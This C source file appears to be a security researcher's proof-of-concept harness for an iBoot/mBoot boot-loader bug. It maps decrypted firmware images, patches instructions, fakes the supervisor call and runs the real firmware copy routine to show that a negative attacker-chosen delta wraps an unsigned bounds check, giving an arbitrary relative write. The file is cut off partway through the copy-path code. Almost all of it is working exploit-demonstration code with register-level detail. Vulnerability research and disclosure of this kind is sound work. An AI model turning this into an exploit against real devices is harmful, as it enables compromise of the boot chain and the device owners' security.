// homing.c -- Report 5 (V4D): iBoot record-homing delta-copy unsigned-guard wrap
// ---------------------------------------------------------------------------
// Firmware: mBoot-18000.162.8 t8140    (/tmp/ds_iboot/iboot_dec.bin)
//           mBoot-18000.162.10         (/tmp/ds_iboot/23g83/iboot_dec_23g83.bin)
// Image address space is identity-mapped to the file offset (addr == file off).
//
// FINDING PROVEN LIVE HERE. iBoot FUN_00199150 pass-2 "record homing", per
// decoded record matched against a home descriptor object, computes:
//   old @0x199954 / new @0x199B28 : ldr x9,[x25,#0x30]!       KEY = *(obj+0x30)
//   old @0x199958 / new @0x199B2C : sub x9,x8,x9              DELTA = rec.base - KEY (attacker signed)
//   old @0x19995c..60             : mov x23,x25 ; ldr x8,[x23,#-0x18]!
//                                                            WBASE = *(obj+0x18)
//   old @0x199964 / new @0x199B38 : add x27,x8,x9             DST = WBASE + DELTA   <- attacker arithmetic
//   old @0x199974..78 / new @0x199B48 : add x8,x0,#3 ; and x22,x8,#-4  LEN = align4(V+3)
//   old @0x199980 / new @0x199B54 : mov x0,x27 ; bl FUN_0019912c      probe(DST)->w0
//   old @0x19999c..b0             : E = FUN_0019a770(obj+0x18,obj+0x18,obj+0x30)
//                                     = *(obj+0x20) - *(obj+0x18)    window extent gauge
//   old @0x1999b4..c0 / new @0x199B88..94 :
//                    sub x8,x0,x8 ; cmp x9,x8 ; b.hi -> mov w1,#0x86 ; bl panic
//                                  ONLY GUARD: LEN >u (E - DELTA), UNSIGNED.
//   old @0x1999d4..a18            : dest quad {DST,DST,DST+LEN} via REAL FUN_0019A444,
//                     copy via REAL FUN_00167d64(dstslice,srcslice,[sp]=LEN);
//                     dest fence == [DST,DST+LEN)                 <- VACUOUS self-fence.
//
// Negative DELTA underflows (E - DELTA) to ~2^64, the guard passes, and the
// real copier linearly writes decoded-content bytes at an attacker-chosen
// address relative to the home-window anchor.
//
// Harness discipline modeled on chain.c (Report4_SPLT). Sanctioned LEVEL B
// hybrid: memory-touching / decision primitives are REAL mapped firmware code
// executed verbatim; loop glue + frame provisioning are transcriptions cited
// instruction-by-instruction in README.md.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <signal.h>
#include <setjmp.h>
#include <errno.h>
#include <dlfcn.h>
#include <execinfo.h>

typedef uint8_t  u8;  typedef uint16_t u16; typedef uint32_t u32; typedef uint64_t u64;
typedef int64_t  s64;

#define TEXT_SPLIT 0x204000UL

#define FW_PATH_OLD "/tmp/ds_iboot/iboot_dec.bin"
#define FW_PATH_NEW "/tmp/ds_iboot/23g83/iboot_dec_23g83.bin"

struct offs {
  uintptr_t PASS2_ENTRY;     /* mid-body entry (ldr x9,[x25,#0x30]!)       */
  uintptr_t PROBE_FN;        /* FUN_0019912C                              */
  uintptr_t SVC_SITE;        /* svc #0x32 instruction                     */
  uintptr_t TRANSLATE_HEAD;  /* FUN_00036F1C                              */
  uintptr_t AT_BODY;         /* FUN_00036D20                              */
  uintptr_t COARSE_CHK;      /* FUN_00039AC0                              */
  uintptr_t MEMTOP_GET;      /* FUN_0003DB20                              */
  uintptr_t EXTENT_GETTER;   /* FUN_0019A40C glue                         */
  uintptr_t RANGE_MATH;      /* FUN_0019A770                              */
  uintptr_t DEST_QUAD;       /* FUN_0019A444                              */
  uintptr_t COPIER;          /* FUN_00167D64                              */
  uintptr_t COPY_BODY;       /* FUN_00167DD8                              */
  uintptr_t PANIC86_BLOCK;   /* bl msgid ; mov w1,#0x86 ; bl panic        */
  uintptr_t PANIC_FN;        /* FUN_0007E6B8                              */
  uintptr_t ZERO_FILL;       /* FUN_0016B780                              */
};
static struct offs O;
static const char *g_fw_path;
static int g_newfw;
static u8 *g_fw; static size_t g_fw_sz;

static void set_offs(int n) {
  if (!n) {
    O.PASS2_ENTRY=0x199954; O.PROBE_FN=0x19912C; O.SVC_SITE=0x036F60;
    O.TRANSLATE_HEAD=0x036F1C; O.AT_BODY=0x036D24; O.COARSE_CHK=0x039AC0;
    O.MEMTOP_GET=0x03DB20; O.EXTENT_GETTER=0x19A40C; O.RANGE_MATH=0x19A770;
    O.DEST_QUAD=0x19A444; O.COPIER=0x167D64; O.COPY_BODY=0x167DD8;
    O.PANIC86_BLOCK=0x199BC0; O.PANIC_FN=0x07E6B8; O.ZERO_FILL=0x16B780;
  } else {
    O.PASS2_ENTRY=0x199B28; O.PROBE_FN=0x199300; O.SVC_SITE=0x036F88;
    O.TRANSLATE_HEAD=0x036F44; O.AT_BODY=0x036D4C; O.COARSE_CHK=0x039B30;
    O.MEMTOP_GET=0x03DB48; O.EXTENT_GETTER=0x19A5E0; O.RANGE_MATH=0x19A944;
    O.DEST_QUAD=0x19A618; O.COPIER=0x167F24; O.COPY_BODY=0x167F98;
    O.PANIC86_BLOCK=0x199D90; O.PANIC_FN=0x07E7B4; O.ZERO_FILL=0x16B940;
  }
}

/* ============================ fault guards ================================ */
struct F { int signo; u64 pc, addr, x0, x1, x2, x3, lr; };
static struct F g_Fcur;
static sigjmp_buf g_jb;
static volatile int g_armed;

static void fault_handler(int sig, siginfo_t *si, void *uc) {
  ucontext_t *u = (ucontext_t*)uc;
  if (!g_armed) {
    Dl_info di; memset(&di, 0, sizeof(di));
    int has_sym = dladdr((const void*)(uintptr_t)u->uc_mcontext->__ss.__pc, &di);
    fprintf(stderr, "[fault-unarmed] pid=%d sig=%d pc=%llx (fw+%llx) addr=%llx "
            "x0=%llx x1=%llx lr=%llx sp=%llx host_sym=%s(%s)+%llx\n", (int)getpid(), sig,
            (unsigned long long)u->uc_mcontext->__ss.__pc,
            (unsigned long long)(u->uc_mcontext->__ss.__pc -
                                 (u64)(uintptr_t)g_fw),
            (unsigned long long)(uintptr_t)si->si_addr,
            (unsigned long long)u->uc_mcontext->__ss.__x[0],
            (unsigned long long)u->uc_mcontext->__ss.__x[1],
            (unsigned long long)u->uc_mcontext->__ss.__lr,
            (unsigned long long)u->uc_mcontext->__ss.__sp,
            has_sym ? (di.dli_sname ? di.dli_sname : "?") : "none",
            has_sym ? (di.dli_fname ? di.dli_fname : "?") : "-",
            (unsigned long long)(has_sym ?
              (u64)((char*)u->uc_mcontext->__ss.__pc - (char*)di.dli_saddr) : 0));
    if (getenv("DS_PARK_ON_FAULT")) {
      fprintf(stderr, "[fault-unarmed] PARKING pid=%d for inspection\n",
              (int)getpid());
      for (;;) pause();
    }
    { void *bt[16]; int n = backtrace(bt, 16);
      fprintf(stderr, "[fault-unarmed] backtrace depth=%d:\n", n);
      backtrace_symbols_fd(bt, n, 2); }
    _exit(66);
  }
  g_armed = 0;
  memset(&g_Fcur, 0, sizeof(g_Fcur));
  g_Fcur.signo = sig;
  g_Fcur.pc   = u->uc_mcontext->__ss.__pc;
  g_Fcur.addr = (u64)(uintptr_t)si->si_addr;
  g_Fcur.x0 = u->uc_mcontext->__ss.__x[0];
  g_Fcur.x1 = u->uc_mcontext->__ss.__x[1];
  g_Fcur.x2 = u->uc_mcontext->__ss.__x[2];
  g_Fcur.x3 = u->uc_mcontext->__ss.__x[3];
  g_Fcur.lr = u->uc_mcontext->__ss.__lr;
  siglongjmp(g_jb, 1);
}
#define GUARDED(expr, outR) do { \
  g_armed = 1; alarm(8); \
  memset(&(outR), 0, sizeof(outR)); \
  if (sigsetjmp(g_jb, 1) == 0) { (outR).ret = (expr); (outR).faulted = 0; g_armed = 0; alarm(0); } \
  else { (outR).ret = -9999; (outR).faulted = 1; (outR).f = g_Fcur; alarm(0); } \
} while (0)

struct R { long ret; int faulted; struct F f; };

#define FW_NAME_OLD "mBoot-18000.162.8"
#define FW_NAME_NEW "mBoot-18000.162.10"

/* ========================= firmware mapping =============================== */
static void fw_map(void) {
  g_fw_path = getenv("DS_FW");
  g_newfw = (g_fw_path != NULL && strstr(g_fw_path, "23g83") != NULL);
  if (!g_fw_path) g_fw_path = FW_PATH_OLD;
  set_offs(g_newfw);
  int fd = open(g_fw_path, O_RDONLY);
  if (fd < 0) { perror("open fw"); exit(1); }
  struct stat st; fstat(fd, &st); g_fw_sz = st.st_size;
  size_t rounded = (g_fw_sz + 0x3FFF) & ~0x3FFFul;
  size_t span = TEXT_SPLIT + ((rounded - TEXT_SPLIT + 0x3FFF) & ~0x3FFFul) + (16<<20);
  u8 *rsv = mmap(NULL, span, PROT_NONE, MAP_ANON|MAP_PRIVATE, -1, 0);
  if (rsv == MAP_FAILED) { perror("mmap rsv"); exit(1); }
  if (mmap(rsv, TEXT_SPLIT, PROT_READ|PROT_EXEC, MAP_FILE|MAP_PRIVATE|MAP_FIXED, fd, 0) != rsv)
    { perror("mmap text"); exit(1); }
  if (mmap(rsv + TEXT_SPLIT, rounded - TEXT_SPLIT, PROT_READ|PROT_WRITE,
           MAP_FILE|MAP_PRIVATE|MAP_FIXED, fd, TEXT_SPLIT) != rsv + TEXT_SPLIT)
    { perror("mmap data"); exit(1); }
  if (mmap(rsv + rounded, span - rounded, PROT_READ|PROT_WRITE,
           MAP_ANON|MAP_PRIVATE|MAP_FIXED, -1, 0) != rsv + rounded)
    { perror("mmap bss"); exit(1); }
  g_fw = rsv;
  close(fd);

  /* The REAL memtop getter FUN_0003DB20 materializes the hardware-seed base
   * via 3 words at its head (movz/movk x8 = 0x300730024) and reads the seed
   * ([x8-0x24] bit2 valid, [x8] & 0xFFFF -> memtop = (w&0xFFFF)<<20). macOS
   * refuses to map the 0x300730000 band at all (mmap MAP_FIXED and
   * mach_vm_allocate FIXED both fail), so the constant is RELOCATED to a
   * seed page in our anon tail: same 2-value seed -> REAL value math computes
   * the REAL 0x200000000. Disclosed as instrumentation in README.md.        */
  {
    u8 *seed = rsv + rounded + 0x8000;          /* page-aligned anon tail  */
    *(volatile u32*)(seed) = 4;                 /* bit2 = seed valid       */
    *(volatile u32*)(seed + 0x24) = 0x2000;     /* -> (0x2000&0xFFFF)<<20  */
    u64 tgt = (u64)(uintptr_t)(seed + 0x24);
    u32 w[3];
    w[0] = 0xD2800008u | (u32)(((tgt >>  0) & 0xFFFF) << 5);   /* movz x8  */
    w[1] = 0xF2A00008u | (u32)(((tgt >> 16) & 0xFFFF) << 5);   /* movk #1  */
    w[2] = 0xF2C00008u | (u32)(((tgt >> 32) & 0xFFFF) << 5);   /* movk #2  */
    u8 *mtp = g_fw + O.MEMTOP_GET;
    if (mprotect((void*)(((uintptr_t)mtp) & ~0x3FFFul), 0x4000,
                 PROT_READ|PROT_WRITE) != 0) { perror("mprotect memtop"); exit(1); }
    memcpy(mtp, w, 12);
    if (mprotect((void*)(((uintptr_t)mtp) & ~0x3FFFul), 0x4000,
                 PROT_READ|PROT_EXEC) != 0) { perror("mprotect memtop rx"); exit(1); }
    if (mprotect((void*)seed, 0x4000, PROT_READ) != 0)
      { perror("mprotect seed"); exit(1); }
  }
}

/* ================= shared geography ======================================= */
struct geo {
  u8 *lo_guard_dummy;             /* decorative bottom guard               */
  u8 *apron, *win, *hi_apron;
  u8 *hole;                       /* dedicated PROT_NONE page (N2 cell)    */
  uintptr_t wbase;
  u8 *arena; size_t arena_sz;
};
static struct geo G;

static void *shared_rw(size_t n) {
  void *p = mmap(NULL, n, PROT_READ|PROT_WRITE, MAP_ANON|MAP_SHARED, -1, 0);
  if (p == MAP_FAILED) { perror("mmap shared"); exit(1); }
  return p;
}
static void guard_page(void **slot) {
  void *p = mmap(NULL, 0x1000, PROT_NONE, MAP_ANON|MAP_SHARED, -1, 0);
  if (p == MAP_FAILED) { perror("mmap guard"); exit(1); }
  *(void**)slot = p;
}

static void geo_build(void) {
  G.apron    = shared_rw(0x30000); memset(G.apron,    0xC3, 0x30000);
  G.win      = shared_rw(0x40000); memset(G.win,      0xEE, 0x40000);
  G.hi_apron = shared_rw(0x08000); memset(G.hi_apron, 0xB7, 0x08000);
  G.wbase    = (uintptr_t)G.win;
  guard_page((void**)&G.lo_guard_dummy);
  /* the N2 fault target: a dedicated PROT_NONE page (carved as its own
   * mapping so nothing else depends on it)                              */
  {
    u8 *h = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_SHARED, -1, 0);
    if (h == MAP_FAILED) { perror("hole"); exit(1); }
    memset(h, 0xB7, 0x1000);
    mprotect(h, 0x1000, PROT_NONE);
    G.hole = h;
  }
  G.arena_sz = 0x10000;
  G.arena = shared_rw(G.arena_sz);
}

/* distinctive decoded-content marker: per cell/run salted */
static void build_marker(u8 *p, size_t len, u8 cell_id, u8 run_no) {
  for (size_t i = 0; i < len; i += 4) {
    p[i+0]='H'; p[i+1]='M'; p[i+2]='G';
    p[i+3]=(u8)(cell_id ^ run_no ^ (u8)(i>>2));
  }
}
static int check_marker(const u8 *p, size_t len, u8 cell_id, u8 run_no) {
  u8 tmp[4];
  for (size_t i = 0; i < len; i += 4) {
    tmp[0]='H'; tmp[1]='M'; tmp[2]='G';
    tmp[3]=(u8)(cell_id ^ run_no ^ (u8)(i>>2));
    if (memcmp(p+i,tmp,4)) return 0;
  }
  return 1;
}
static void hexline(const char *tag, const volatile u8 *p, size_t n) {
  printf("    %-22s @%p:", tag, (void*)(uintptr_t)p);
  for (size_t i = 0; i < n; i++) printf(" %02x", p[i]);
  printf("\n");
}

/* ======================== SVC supervisor shim =============================
 * REAL probe FUN_0019912C tail-calls FUN_00036F1C which performs the stage-1
 * translation by dispatching to the boot supervisor via svc #0x32 at old
 * @0x36f60 / new @0x36f88. macOS EL0 has no iBoot supervisor: the shim plays
 * that role at exactly that instruction. It answers the translation request
 * (host-truthful: writable => mapped), leaves PC past the SVC, and lets the
 * REAL continuation (FUN_00039AC0 coarse rule + branch state machine) run.
 *
 * Encoding of the answer is measured by `calib` (which of the two candidates
 * drives the REAL copy branch for known-good mappings); unmapped always maps
 * to answer 0x1000000000 (non-zero coarse-invalid).                          */
static volatile int g_shim_armed;
static u64 g_shim_calls;
static u64 g_last_answer;
static u64 g_last_dst;
static int g_enc_mode = -1;      /* pinned by calib: 0 raw, 1 >=2^41 handle */

typedef struct { uintptr_t lo, hi; int prot_w; } span_ent;
static span_ent g_spans[24]; static int g_nspans;
static void span_add(uintptr_t lo, uintptr_t hi, int w) {
  if (g_nspans < 24) { g_spans[g_nspans].lo=lo; g_spans[g_nspans].hi=hi; g_spans[g_nspans].prot_w=w; g_nspans++; }
}
static int host_mapped_w(uintptr_t va) {
  va &= ~(uintptr_t)0xFFF;
  for (int i = 0; i < g_nspans; i++)
    if (va >= g_spans[i].lo && va < g_spans[i].hi) return g_spans[i].prot_w;
  return 0;
}
static u64 shim_answer(u64 dst, int force_invalid) {
  /* FUN_39AC0 coarse (decoded @0x39ad0..f0): answer>>40==0 OR answer >=
   * memtop+2^40 -> returns 0 -> probe FUN_19912C cset w0,eq -> w0=1 ->
   * pass-2 COPY route @0x1999d0.  answer in [2^40, memtop+2^40) ->
   * returns answer != 0 -> probe w0=0 -> pass-2 FILL route @0x199a20. */
  if (force_invalid)
    return 0x1000000000ull;   /* 2^40: coarse-nonzero band -> probe 0 -> FILL */
  if (!host_mapped_w(dst))
    return 0x2000000000ull;   /* 2^41: outside band -> probe 1 -> COPY        */
  u64 ans = dst & ~(u64)0xFFF;
  if (g_enc_mode == 1) ans |= 0x2000000000ull;
  return ans;
}

/* ===================== shared run state =================================== */
static int  g_force_probe_invalid;
static u32  g_cell_index;
static u8   g_run_no;
static const char **g_cell_args;   /* `cell <name>` filter (main-owned)     */
static int  g_ncell_args;

static void dispatch_sig(int sig, siginfo_t *si, void *uc) {
  ucontext_t *u = (ucontext_t*)uc;
  u64 pc = u->uc_mcontext->__ss.__pc;
  /* Both supervisor thunk tails: svc #0x32 @old 0x36f60 / svc #0 @0x36f70.
   * macOS rewrites x0 to the kernel syscall number (0x4e) when delivering
   * SIGSYS for an unrecognized SVC, so the payload register is x19: the
   * translate thunk carries the VA in x19 ('mov x0,x19; svc'), the percpu/
   * memtop fallback carries command 0x4e in x19.                                  */
  u64 site = (u64)((u8*)g_fw + O.SVC_SITE);
  u64 site2 = site + 0x10;                      /* svc #0 tail              */
  if (g_shim_armed && (pc == site || pc == site + 4 ||
                       pc == site2 || pc == site2 + 4)) {
    u64 payload = u->uc_mcontext->__ss.__x[19];
    u64 ans;
    if (payload == 0x4e)
      ans = 0x1000000000ull;        /* non-minus-1 percpu -> svc-translate   */
    else
      ans = shim_answer(payload, g_force_probe_invalid);
    g_last_answer = ans;
    g_last_dst    = payload;
    fprintf(stderr, "[shim] hit pc_off=%llx x0=%llx x19=%llx -> x0=%llx\n",
            (unsigned long long)(pc - (u64)(uintptr_t)g_fw),
            (unsigned long long)u->uc_mcontext->__ss.__x[0],
            (unsigned long long)payload,
            (unsigned long long)ans);
    u->uc_mcontext->__ss.__x[0] = ans;
    u->uc_mcontext->__ss.__pc = (pc == site || pc == site2) ? pc + 4 : pc;
    g_shim_calls++;
    return;
  }
  fault_handler(sig, si, uc);
}
static void install_handlers(void) {
  struct sigaction sa; memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = dispatch_sig; sa.sa_flags = SA_SIGINFO;
  sigaction(SIGILL,  &sa, NULL); sigaction(SIGSYS,  &sa, NULL);
  sigaction(SIGSEGV, &sa, NULL); sigaction(SIGBUS,  &sa, NULL);
  sigaction(SIGTRAP, &sa, NULL); sigaction(SIGABRT, &sa, NULL);
  sigaction(SIGFPE,  &sa, NULL);
  struct sigaction sb; memset(&sb, 0, sizeof(sb));
  sb.sa_sigaction = fault_handler; sb.sa_flags = SA_SIGINFO;
  sigaction(SIGALRM, &sb, NULL);
}

static int check_marker(const u8 *p, size_t len, u8 cell_id, u8 run_no);
static size_t count_byte(const volatile u8 *p, size_t n, u8 b) {
  size_t c = 0;
  for (size_t i = 0; i < n; i++) if (p[i] == b) c++;
  return c;
}
static void build_marker(u8 *p, size_t len, u8 cell_id, u8 run_no);
static void hexline(const char *tag, const volatile u8 *p, size_t n);

/* ==================== firmware primitive bindings =========================
 * All bindings call REAL mapped firmware code. Register-pinned callees use
 * explicit hard-register asm; plain-AAPCS callees use direct function
 * pointers.                                                                 */

typedef long (*plain9_t)(u64,u64,u64,u64,u64,u64,u64,u64,u64);
typedef long (*plain3_t)(u64,u64,u64);

/* REAL extent getter FUN_0019A40C: async-glue reading range object at
 * (x20)+0x68 then tail-calling FUN_0019A770(lo,lo,hi). Hard-pins x20.       */
static u64 fw_extent_getter_call(void *ctxbase) {
  register uintptr_t fn __asm__("x17") = (uintptr_t)((u8*)g_fw + O.EXTENT_GETTER);
  register void *ctxreg __asm__("x20") = ctxbase;
  register u64 out __asm__("x0");
  __asm__ volatile("blr %[f]"
    : [out] "=r"(out)
    : [f] "r"(fn), "r"(ctxreg)
    : "lr", "memory", "cc");
  return out;
}

/* REAL range math FUN_0019A770(obj,obj,obj+0x30) -> *(obj+8)-*(obj)         */
static u64 fw_range_math_call(void *obj, void *obj2, void *obj3) {
  plain3_t fn = (plain3_t)((u8*)g_fw + O.RANGE_MATH);
  return (u64)fn((u64)(uintptr_t)obj, (u64)(uintptr_t)obj2, (u64)(uintptr_t)obj3);
}

/* REAL probe FUN_0019912C(dst) -> w0 (svc-shimmed while armed)              */
static u64 fw_probe_call(u64 dst) {
  long (*fn)(u64) = (long (*)(u64))((u8*)g_fw + O.PROBE_FN);
  return (u64)fn(dst);
}

/* REAL coarse checker FUN_00039AC0                                          */
static u64 fw_coarse_call(u64 va) {
  long (*fn)(u64) = (long (*)(u64))((u8*)g_fw + O.COARSE_CHK);
  return (u64)fn(va);
}

/* REAL memtop getter FUN_0003DB20 (hardware-seed patched, see fw_map)       */
static u64 fw_memtop_call(void) {
  long (*fn)(void) = (long (*)(void))((u8*)g_fw + O.MEMTOP_GET);
  return (u64)fn();
}

/* REAL copier FUN_00167D64, AAPCS: p1..p8 in x0..x7, p9 (LEN) pushed on the
 * caller stack at [sp], which the callee reads via 'ldr x8,[x29,#0x10]'
 * after its own 16-byte frame push. Function-pointer with 9 parameters
 * reproduces that placement exactly.                                        */
static u64 fw_copy_call(u64 dst, u64 dlo, u64 dhi, u64 dpad,
                        u64 src, u64 slo, u64 shi, u64 sxtra, u64 len) {
  plain9_t fn = (plain9_t)((u8*)g_fw + O.COPIER);
  return (u64)fn(dst, dlo, dhi, dpad, src, slo, shi, sxtra, len);
}

/* REAL dest-quad builder FUN_0019A444 -- register glue: x27=DST, x8=len,
 * x26=pad; outputs x0..x2 = {DST,DST,DST+len}, x3=x26 (pass-through pad).   */
struct quad3 { u64 a, b, c; };
static struct quad3 fw_dest_quad_build(u64 dst, u64 len, u64 pad) {
  struct quad3 q = {0,0,0};
  register u64 r27 __asm__("x27") = dst;
  register u64 r8  __asm__("x8")  = len;
  register u64 r26 __asm__("x26") = pad;
  register u64 ra __asm__("x0") = 0, rb __asm__("x1") = 0, rc __asm__("x2") = 0;
  __asm__ volatile("blr %[fn]"
    : "+r"(ra), "+r"(rb), "+r"(rc)
    : [fn] "r"((u64)((u8*)g_fw + O.DEST_QUAD)), "r"(r27), "r"(r8), "r"(r26)
    : "memory", "cc", "lr", "x3", "x4", "x5", "x6", "x7", "x9", "x10",
      "x11", "x12", "x13", "x14", "x15", "x16", "x17");
  q.a = ra; q.b = rb; q.c = rc;
  return q;
}

/* REAL fill helper FUN_0016B780 at its invalid-route call-site ABI
 * (old @0x1999a20..34): x0..x2 = dest quad {DST,DST,DST+len}, x3 = pad,
 * x4 = src, x5/x6 = src fence pair from the span triple, x7 = extra member,
 * and [sp] = V (raw extent-getter value). A 9-parameter call reproduces this
 * register + stack layout exactly under AAPCS.                             */
static u64 fw_zero_fill_call(struct quad3 dq, u64 pad,
                             u64 src, u64 slo, u64 shi, u64 sxtra, u64 v_raw) {
  plain9_t fn = (plain9_t)((u8*)g_fw + O.ZERO_FILL);
  return (u64)fn(dq.a, dq.b, dq.c, pad, src, slo, shi, sxtra, v_raw);
}

enum { CELL_POS=0, CELL_NEG, CELL_NEGFAULT, CELL_PANIC, CELL_MISALIGN, CELL_PROBEINV, NCELLS };
struct cellcfg {
  const char *name;
  s64 delta;                /* DELTA = PB - KEY                               */
  u32 rec_off, rec_len;     /* decoded record placement + extent V            */
  int dst_kind;             /* 0 computed, 1 hole page, 2 far unmapped, 3 misalign via delta */
  int force_inv;            /* shim reports unmapped regardless               */
};
static struct cellcfg CELLS[NCELLS] = {
  [CELL_POS]       = { "P1-positive-delta",   0x1230,                  0x000,0x200, 0, 0 },
  [CELL_NEG]       = { "N1-negative-delta",  -0x20000,                 0x010,0x200, 0, 0 },
  [CELL_NEGFAULT]  = { "N2-negative-fault",   -0x8000,                 0x020,0x200, 1, 0 },
  [CELL_PANIC]     = { "T2-guard-wrap-panic", 0x3FF80,                 0x030,0x200, 0, 0 },
  [CELL_MISALIGN]  = { "T1-misaligned-dst",   0x1232,                  0x040,0x200, 3, 0 },
  [CELL_PROBEINV]  = { "Z1-probe-invalid",    0x22000,                 0x050,0x200, 4, 1 },
};

/* ======================== child: one cell run ============================= */
struct objs {
  u8 ctx[0x100];
  u8 homeobj[0x100];
};

static void build_objects(struct objs *ob,
                          uintptr_t arena, u32 rec_off, u32 rec_len,
                          uintptr_t wbase, u64 key) {
  memset(ob, 0, sizeof(*ob));
  /* ctx+0x68 : record data extent as range pair {start, start+V}          */
  *(u64*)(ob->ctx + 0x68) = arena + rec_off;
  *(u64*)(ob->ctx + 0x70) = arena + rec_off + rec_len;
  /* home object: +0x18 WBASE +0x20 WEND +0x30 KEY                         */
  *(u64*)(ob->homeobj + 0x18) = wbase;
  *(u64*)(ob->homeobj + 0x20) = wbase + 0x40000;
  *(u64*)(ob->homeobj + 0x30) = key;
}

static void compute_dst(struct cellcfg *c, s64 delta, u64 *dst_out) {
  switch (c->dst_kind) {
    case 1: *dst_out = (uintptr_t)G.hole; break;
    case 2: case 4: *dst_out = G.wbase + delta; break;
    default:        *dst_out = G.wbase + delta; break;
  }
}

/* classification of a caught fault against firmware function families */
static const char *classify_pc(u64 pc_off) {
  uintptr_t bands[4][2] = {
    {O.COPIER, O.COPY_BODY + 0x400},      /* wrapper+body                      */
    {O.ZERO_FILL, O.ZERO_FILL + 0x900},
    {O.PANIC_FN, O.PANIC_FN + 0x900},
    {O.SVC_SITE - 0x60, O.SVC_SITE + 0x20},
  };
  static const char *names[4] = {
    "REAL-copier-family",
    "REAL-fill-helper-family",
    "REAL-panic-function",
    "probe/translate-stub"
  };
  for (int i = 0; i < 4; i++)
    if (pc_off >= bands[i][0] && pc_off < bands[i][1]) return names[i];
  return "other";
}

/* ---- the actual cell engine (child process body) ------------------------- */
static int child_run_cell(void) {
  struct cellcfg *c = &CELLS[g_cell_index];
  u8 cell_id = (u8)g_cell_index;
  s64 delta  = c->delta;
  u64 key    = G.wbase + 0x30000;         /* anchor: a prior record's base   */
  u64 pb     = key + delta;               /* attacker prior-record base word */

  printf("[cell %s] build: KEY=%llx PB=%llx DELTA=%lld rec_off=%x rec_len(V)=%x\n",
         c->name, (unsigned long long)key, (unsigned long long)pb,
         (long long)delta, c->rec_off, c->rec_len);
  build_marker(G.arena + c->rec_off, c->rec_len, cell_id, g_run_no);
  hexline("decoded-content(src)", G.arena + c->rec_off, 32);

  struct objs ob;
  build_objects(&ob, (uintptr_t)G.arena, c->rec_off, c->rec_len, G.wbase, key);

  /* REAL extent getter FUN_0019A40C(ctx) -> V                              */
  u64 v = fw_extent_getter_call(ob.ctx);
  u64 len = (v + 3) & ~(u64)3;            /* firmware add x8,x0,#3; and #-4  */
  u64 dst;
  compute_dst(c, delta, &dst);

  g_force_probe_invalid = c->force_inv;
  g_shim_armed = 1;
  u64 wprobe = fw_probe_call(dst);
  g_shim_armed = 0;
  printf("[cell %s] REAL probe(DST=%llx) -> w0=%#llx (shim_calls=%llu enc_mode=%d)\n",
         c->name, (unsigned long long)dst, (unsigned long long)wprobe,
         (unsigned long long)g_shim_calls, g_enc_mode);
  fflush(stdout);

  /* guard gauge via REAL FUN_0019A770(obj+0x18,obj+0x18,obj+0x30)          */
  u64 E = fw_range_math_call(ob.homeobj + 0x18, ob.homeobj + 0x18,
                             ob.homeobj + 0x30);
  u64 rhs = E - (u64)(s64)(pb - key);      /* firmware sub x8,x0,x8          */
  printf("[cell %s] E=%llx LEN=%#llx E-DELTA(signed %lld)=%llx LEN>u(rhs)=%d "
         "(negative-delta wrap bypasses = %d)\n",
         c->name, (unsigned long long)E, (unsigned long long)len,
         (long long)delta, (unsigned long long)rhs,
         len > rhs ? 1 : 0,
         ((s64)delta < 0 && !(len > rhs)) ? 1 : 0);
  fflush(stdout);

  if (len > rhs) {
    /* GUARD FIRES in real pass-2 (b.hi @old 0x199bc0 / new 0x199d94):
     * enter the REAL panic block verbatim: bl <msgid>; mov w1,#0x86;
     * bl FUN_0007e6b8.                                                      */
    printf("[cell %s] entering REAL panic block @fw+%llx (expect w1=0x86 receipt)\n",
           c->name, (unsigned long long)O.PANIC86_BLOCK);
    fflush(stdout);
    g_armed = 1; alarm(6);
    if (sigsetjmp(g_jb,1)==0) {
      __asm__ volatile("br %[t]" :: [t]"r"((u64)((u8*)g_fw + O.PANIC86_BLOCK)));
    } else {
      alarm(0);
      printf("[cell %s] FAULT inside/after REAL panic block: sig=%d pc_off=%llx"
             " (%s) addr=%llx x0=%llx x1=%llx\n",
             c->name, g_Fcur.signo,
             (unsigned long long)(g_Fcur.pc - (u64)(uintptr_t)g_fw),
             classify_pc(g_Fcur.pc - (u64)(uintptr_t)g_fw),
             (unsigned long long)g_Fcur.addr,
             (unsigned long long)g_Fcur.x0, (unsigned long long)g_Fcur.x1);
      _exit(70);
    }
    _exit(71);
  }

  if (wprobe == 0) {
    /* REAL pass-2 route selection @0x1999c8/cc: cbz w8 -> FILL route.
     * Executes the REAL zero-fill-route primitives exactly as pass-2 does
     * for an invalid probe: dest quad then FUN_16b780(x4=SRC,x5/x6=src
     * fence pair,x7=span extra member [sp+0xb0],[sp]=V).               */
    printf("[cell %s] probe w0=0 -> REAL pass-2 FILL route: dest quad then"
           " FUN_16b780 on DST=%llx.\n", c->name, (unsigned long long)dst);
    fflush(stdout);
    struct quad3 dq = fw_dest_quad_build(dst, len, 0);
    printf("[cell %s] REAL dest quad builder (@fw+%llx) returned {%llx,%llx,%llx}"
           " — the VACUOUS self-fence: fence==[DST,DST+LEN).\n",
           c->name, (unsigned long long)O.DEST_QUAD,
           (unsigned long long)dq.a,(unsigned long long)dq.b,(unsigned long long)dq.c);
    fflush(stdout);
    struct R r; g_shim_armed = 1;
    GUARDED((r.ret=(long)fw_zero_fill_call(dq, 0,
              (u64)(uintptr_t)(G.arena + c->rec_off),
              (u64)(uintptr_t)G.arena,
              (u64)(uintptr_t)(G.arena + G.arena_sz), 0, v)), r);
    g_shim_armed = 0;
    if (r.faulted)
      printf("[cell %s] FAULT inside REAL fill family as predicted: sig=%d pc_off=%llx"
             " (%s) FAULT_ADDR=%llx == attacker DST? %d\n",
             c->name, r.f.signo,
             (unsigned long long)(r.f.pc - (u64)(uintptr_t)g_fw),
             classify_pc(r.f.pc - (u64)(uintptr_t)g_fw),
             (unsigned long long)r.f.addr,
             r.f.addr >= (dst & ~0xFFFull) &&
             r.f.addr <  (((dst + len) + 0xFFF) & ~0xFFFull));
    else
      printf("[cell %s] REAL fill helper RETURNED cleanly ret=%ld on unmapped"
             " DST (no write observed client-side)\n", c->name, r.ret);
    _exit(72);
  }

  /* normal copy path through the REAL dest-quad builder + REAL copier.
   * Recreates old @0x1999d4..a18 faithfully:
   *   ldr x8,[sp,#0x70](align4 V) ; bl FUN_0019a444 -> {DST,DST,DST+len}
   *   src slice from span triple, [sp]=LEN ; bl FUN_00167d64                */
